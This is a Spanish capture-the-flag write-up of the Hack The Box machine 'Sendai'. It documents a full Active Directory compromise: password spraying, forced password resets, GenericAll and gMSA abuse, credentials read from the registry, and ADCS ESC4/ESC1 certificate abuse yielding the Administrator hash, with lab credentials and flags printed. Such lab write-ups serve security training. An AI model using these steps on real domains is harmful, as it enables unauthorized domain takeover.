---
tags:
title: Sendai - Medium(HTB)
permalink: /Sendai-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash

```
### SMB Enumeration

Como el usuario de invitados esta habilitados, realice la conexión con `smbclient` de impacket, viendo así que en el recurso compartido `sendai` había entre muchas cosas, un archivo de texto.

```bash
impacket-smbclient sendai.vl/guest@dc.sendai.vl -dc-ip 10.129.234.66
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
Type help for list of commands
# use sendai
ls
# ls
drw-rw-rw-          0  Tue Jul 18 14:31:04 2023 .
drw-rw-rw-          0  Tue Apr 15 23:55:42 2025 ..
drw-rw-rw-          0  Tue Jul 11 10:26:34 2023 hr
-rw-rw-rw-       1372  Tue Jul 18 14:34:15 2023 incident.txt
drw-rw-rw-          0  Tue Jul 18 10:16:46 2023 it
drw-rw-rw-          0  Tue Jul 11 10:26:34 2023 legal
drw-rw-rw-          0  Tue Jul 18 10:17:35 2023 security
drw-rw-rw-          0  Tue Jul 11 10:26:34 2023 transfer
# cd security
```

En el contenido del mismo habia lo siguiente:

```bash
Dear valued employees,

We hope this message finds you well. We would like to inform you about an important security update regarding user account passwords. Recently, we conducted a thorough penetration test, which revealed that a significant number of user accounts have weak and insecure passwords.

To address this concern and maintain the highest level of security within our organization, the IT department has taken immediate action. All user accounts with insecure passwords have been expired as a precautionary measure. This means that affected users will be required to change their passwords upon their next login.

We kindly request all impacted users to follow the password reset process promptly to ensure the security and integrity of our systems. Please bear in mind that strong passwords play a crucial role in safeguarding sensitive information and protecting our network from potential threats.

If you need assistance or have any questions regarding the password reset procedure, please don't hesitate to reach out to the IT support team. They will be more than happy to guide you through the process and provide any necessary support.

Thank you for your cooperation and commitment to maintaining a secure environment for all of us. Your vigilance and adherence to robust security practices contribute significantly to our collective safety. 
```

En el mismo se habla que debido a temas de seguridad, todas las cuentas con passwords débiles, fueron reseteadas, por lo que las mismas necesitan un cambio de password.

## Shell as mgtsvc$

Como se puede ver, realice una especio de `Passwrod spraying`, pero sin password para cada usuario que estaba en el recuso `transfer`, viendo que para el usuario `elliot.yates` y `thomas.powell` el estado de la cuenta muestra un cambio de password.

```bash
nxc smb sendai.vl -u users -p ''          
SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)                                                                                                                                                   
SMB         10.129.234.66   445    DC               [-] sendai.vl\anthony.smith: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\clifford.davey: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\elliot.yates: STATUS_PASSWORD_MUST_CHANGE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\lisa.williams: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\susan.harper: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [+] sendai.vl\temp: (Guest)
SMB         10.129.234.66   445    DC               [+] sendai.vl\thomas.powell: STATUS_PASSWORD_MUST_CHANGE
```
### Change password

Para configurarle una nueva password, a estos dos usuarios use `kpasswd`, indicando la contraseña vacía y en mi caso le asigne la password `Lalahola23!$`, a cada uno

```bash
kpasswd elliot.yates
Password for elliot.yates@SENDAI.VL: 
Enter new password: 
Enter it again: 
Password changed.

<SNIP>

kpasswd thomas.powell
Password for thomas.powell@SENDAI.VL: 
Enter new password: 
Enter it again: 
Password changed.
```
### Validate credentials

Ahora usando las mismas veo que son validas.

```bash
nxc smb sendai.vl -u users -p 'Lalahola23!$'                     
SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.66   445    DC               [-] sendai.vl\anthony.smith:Lalahola23!$ STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\clifford.davey:Lalahola23!$ STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [+] sendai.vl\elliot.yates:Lalahola23!$
<snip>
SMB         10.129.234.66   445    DC               [+] sendai.vl\thomas.powell:Lalahola23!$
```

Las mismas las use para recolectar todos los usuarios validos del dominio con `rpcclient`.

```bash
rpcclient -U 'elliot.yates%Lalahola23!$'  10.129.234.66
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[sqlsvc] rid:[0x450]
user:[websvc] rid:[0x451]
user:[Dorothy.Jones] rid:[0x454]
user:[Kerry.Robinson] rid:[0x455]
user:[Naomi.Gardner] rid:[0x456]
user:[Anthony.Smith] rid:[0x457]
user:[Susan.Harper] rid:[0x458]
user:[Stephen.Simpson] rid:[0x459]
user:[Marie.Gallagher] rid:[0x45a]
user:[Kathleen.Kelly] rid:[0x45b]
user:[Norman.Baxter] rid:[0x45c]
user:[Jason.Brady] rid:[0x45d]
user:[Elliot.Yates] rid:[0x45e]
user:[Malcolm.Smith] rid:[0x45f]
user:[Lisa.Williams] rid:[0x460]
user:[Ross.Sullivan] rid:[0x461]
user:[Clifford.Davey] rid:[0x462]
user:[Declan.Jenkins] rid:[0x463]
user:[Lawrence.Grant] rid:[0x464]
user:[Leslie.Johnson] rid:[0x465]
user:[Megan.Edwards] rid:[0x466]
user:[Thomas.Powell] rid:[0x467]
```
### GenericAll abuse

Además con la recolección de datos que hice con `rusthound`, vi que estos dos usuarios, eran miembros del grupo `Support`, que a su vez los miembros de este tenían privilegios `GenericAll`, sobre el grupo `Admsvc`.

![image-center](/assets/images/Pasted image 20260202211257.png)

Para aprovechar el mismo, puedo usar bloodyAD para agregar a estos usuarios a dicho grupo, en mi caso agregue al usuario `thomas.powell`.

```bash
bloodyAD -d sendai.vl -u 'thomas.powell' -p 'Lalahola23!$' --host dc.sendai.vl add groupMember admsvc thomas.powell
[+] thomas.powell added to admsvc
```
### Read GMSA Password

También por otro lado, vi que los usuarios de este grupo, tienen el permios `ReadGMSAPassword` sobre `mgtsvc$`.

![image-center](/assets/images/Pasted image 20260202212850.png)

Por lo que use [gMSADumper.py](https://github.com/micahvandeusen/gMSADumper) para poder obtener un hash `NT` del usuario `mgtsvc$`.

```bash
python3 gMSADumper.py -u 'thomas.powell' -p 'Lalahola23!$' -d 'sendai.vl'
Users or groups who can read password for mgtsvc$:
 > admsvc
mgtsvc$:::aef24dfbb4c6cf2abd6a774bf2d77a70
mgtsvc$:aes256-cts-hmac-sha1-96:640b0387aa1fc9d23fbf5a6f84dd6dde65f03b0b2d91f8907af386ec7c8c4a73
mgtsvc$:aes128-cts-hmac-sha1-96:1e70d8e525b3520dc881672530f9b2ee
```

Con el uso del mismo me conecte con `evil-winrm`.

```powershell
evil-winrm -i sendai.vl -u mgtsvc$ -H aef24dfbb4c6cf2abd6a774bf2d77a70

<SNIP>

*Evil-WinRM* PS C:\programdata> type C:\user.txt
fff335936142d21a6fa44123b897cd3e
```
## Auth as clifford.davey.

### Processes

Viendo los procesos que se ejecutan en tiempo real, y veo `2` que no son comunes, como `ECSLaunch` y `helpdesk`.

```powershell
Get-Process

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    118       7     2424       7308              3868   0 AggregatorHost
    387      33    12060      21220               828   0 certsrv
     81       6     2252       4016              3520   0 cmd
    150      10     6584      13240              3620   0 conhost
    586      22     2080       6536               416   0 csrss
    174      11     1848       6032               524   1 csrss
    425      35    17644      26220              2956   0 dfsrs
    200      13     2364       8628              3396   0 dfssvc
    281      15     3912      15060              4068   0 dllhost
  10387    7492   130212     128996              2268   0 dns
    633      26    19428      47012              1132   1 dwm
    171      12    23416      17500              4948   0 EC2Launch
     72       6      800       3772              3284   0 EC2LaunchService
     39       6     1268       3612              4728   1 fontdrvhost
     39       6     1328       3720              4736   0 fontdrvhost
    198      12    12276      12640              3084   0 helpdesk
<SNIP>
```

Viendo en los registros para el proceso de `helpdesk`, veo que en el registro del mismo, hay unas credenciales para el usuario `clifford.davey`.

```powershell
*Evil-WinRM* PS C:\programdata> reg query "HKLM\SYSTEM\CurrentControlSet\Services" /s /f helpdesk

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog\HelpdeskLog

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog\HelpdeskLog\HelpdeskLog

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog\HelpdeskLog\HelpdeskSource

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Support
    ImagePath    REG_EXPAND_SZ    C:\WINDOWS\helpdesk.exe -u clifford.davey -p RFmoB2WplgE_3p -k netsvcs

End of search: 4 match(es) found.
```

### ADCS Enumeration

Con las credenciales de este usuario, enumere plantillas vulnerables.

```bash
certipy-ad find -u 'clifford.davey' -p 'RFmoB2WplgE_3p' -dc-host sendai.vl -target 10.129.234.66 -dc-ip 10.129.234.66 -vulnerable 
Certipy v5.0.4 - by Oliver Lyak (ly4k)
<SNIP>

cat 20260202220817_Certipy.txt                                                                                                    
Certificate Authorities
  0
    CA Name                             : sendai-DC-CA
    DNS Name                            : dc.sendai.vl
    Certificate Subject                 : CN=sendai-DC-CA, DC=sendai, DC=vl
    Certificate Serial Number           : 326E51327366FC954831ECD5C04423BE
    Certificate Validity Start          : 2023-07-11 09:19:29+00:00
    Certificate Validity End            : 2123-07-11 09:29:29+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : SENDAI.VL\Administrators
      Access Rights
        ManageCa                        : SENDAI.VL\Administrators
                                          SENDAI.VL\Domain Admins
                                          SENDAI.VL\Enterprise Admins
        ManageCertificates              : SENDAI.VL\Administrators
                                          SENDAI.VL\Domain Admins
                                          SENDAI.VL\Enterprise Admins
        Enroll                          : SENDAI.VL\Authenticated Users
Certificate Templates
  0
    Template Name                       : SendaiComputer
    Display Name                        : SendaiComputer
    Certificate Authorities             : sendai-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Server Authentication
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 100 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 4096
    Template Created                    : 2023-07-11T12:46:12+00:00
    Template Last Modified              : 2023-07-11T12:46:19+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SENDAI.VL\Domain Admins
                                          SENDAI.VL\Domain Computers
                                          SENDAI.VL\Enterprise Admins
      Object Control Permissions
        Owner                           : SENDAI.VL\Administrator
        Full Control Principals         : SENDAI.VL\Domain Admins
                                          SENDAI.VL\Enterprise Admins
                                          SENDAI.VL\ca-operators
        Write Owner Principals          : SENDAI.VL\Domain Admins
                                          SENDAI.VL\Enterprise Admins
                                          SENDAI.VL\ca-operators
        Write Dacl Principals           : SENDAI.VL\Domain Admins
                                          SENDAI.VL\Enterprise Admins
                                          SENDAI.VL\ca-operators
        Write Property Enroll           : SENDAI.VL\Domain Admins
                                          SENDAI.VL\Domain Computers
                                          SENDAI.VL\Enterprise Admins
    [+] User Enrollable Principals      : SENDAI.VL\ca-operators
                                          SENDAI.VL\Domain Computers
    [+] User ACL Principals             : SENDAI.VL\ca-operators
    [!] Vulnerabilities
      ESC4                              : User has dangerous permissions.
                                                                          
```
### ESC4

Viendo los resultado de el escaneo, el dominio es vulnerable a `ESC4`. Por lo que primero tengo que actualizar la plantilla y para luego revertir los cambios use el parametro `-write-default-configuration`.

```bash
certipy-ad  template -u 'clifford.davey@sendai.vl' -p 'RFmoB2WplgE_3p' -dc-ip '10.129.234.66' -template 'SendaiComputer' -write-default-configuration -no-save
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Updating certificate template 'SendaiComputer'
[*] Replacing:
[*]     nTSecurityDescriptor: b'\x01\x00\x04\x9c0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x00\x1c\x00\x01\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00'
[*]     flags: 66104
[*]     pKIDefaultKeySpec: 2
[*]     pKIKeyUsage: b'\x86\x00'
[*]     pKIMaxIssuingDepth: -1
[*]     pKICriticalExtensions: ['2.5.29.19', '2.5.29.15']
[*]     pKIExpirationPeriod: b'\x00@9\x87.\xe1\xfe\xff'
[*]     pKIExtendedKeyUsage: ['1.3.6.1.5.5.7.3.2']
[*]     pKIDefaultCSPs: ['2,Microsoft Base Cryptographic Provider v1.0', '1,Microsoft Enhanced Cryptographic Provider v1.0']
[*]     msPKI-Enrollment-Flag: 0
[*]     msPKI-Private-Key-Flag: 16
[*]     msPKI-Certificate-Name-Flag: 1
[*]     msPKI-Minimal-Key-Size: 2048
[*]     msPKI-Certificate-Application-Policy: ['1.3.6.1.5.5.7.3.2']
Are you sure you want to apply these changes to 'SendaiComputer'? (y/N): y
[*] Successfully updated 'SendaiComputer'
```
### Exploit

Luego de modificar la plantilla, es de notar que algunas de los parámetros importantes cambiaron su estados a `True`, además una vez de modifica la misma se puede ver con el `ESC1` aparece detectado.

```bash
certipy-ad  find -u 'clifford.davey@sendai.vl' -p 'RFmoB2WplgE_3p' -vulnerable -stdout -dc-ip 10.129.234.66
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
<SNIP>
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
      ESC4                              : User has dangerous permissions.

```

Con esta vulnerabilidad, puedo solicitar un certificado a nombre de `administrator`.

```bash
certipy-ad  req \
    -u 'clifford.davey' -p 'RFmoB2WplgE_3p' \          
    -dc-ip '10.129.234.66' -target 'dc.sendai.vl' \
    -ca 'sendai-DC-CA' -template 'SendaiComputer' -upn 'administrator@sendai.vl' -sid 'S-1-5-21-3085872742-570972823-736764132-500'
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 8
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@sendai.vl'
[*] Certificate object SID is 'S-1-5-21-3085872742-570972823-736764132-500'
[*] Saving certificate and private key to 'administrator.pfx'
File 'administrator.pfx' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote certificate and private key to 'administrator.pfx'
```

Con el que luego me autentique para poder obtener un hash `NTLM`.

```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.234.66
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@sendai.vl'
[*]     SAN URL SID: 'S-1-5-21-3085872742-570972823-736764132-500'
[*]     Security Extension SID: 'S-1-5-21-3085872742-570972823-736764132-500'
[*] Using principal: 'administrator@sendai.vl'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sendai.vl': aad3b435b51404eeaad3b435b51404ee:cfb106feec8b89a3d98e14dcbe8d087a
```
### Shell

Con el uso del mismo me conecte nuevamente con `evil-winrm`.

```powershell
sudo evil-winrm -i sendai.vl -u administrator -H cfb106feec8b89a3d98e14dcbe8d087a
                                        
Evil-WinRM shell v3.9

<SNIP>

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ../desktop/root.txt
1bc134a7b4ae19fcc072082026d991cf
```

`~Happy Hacking.`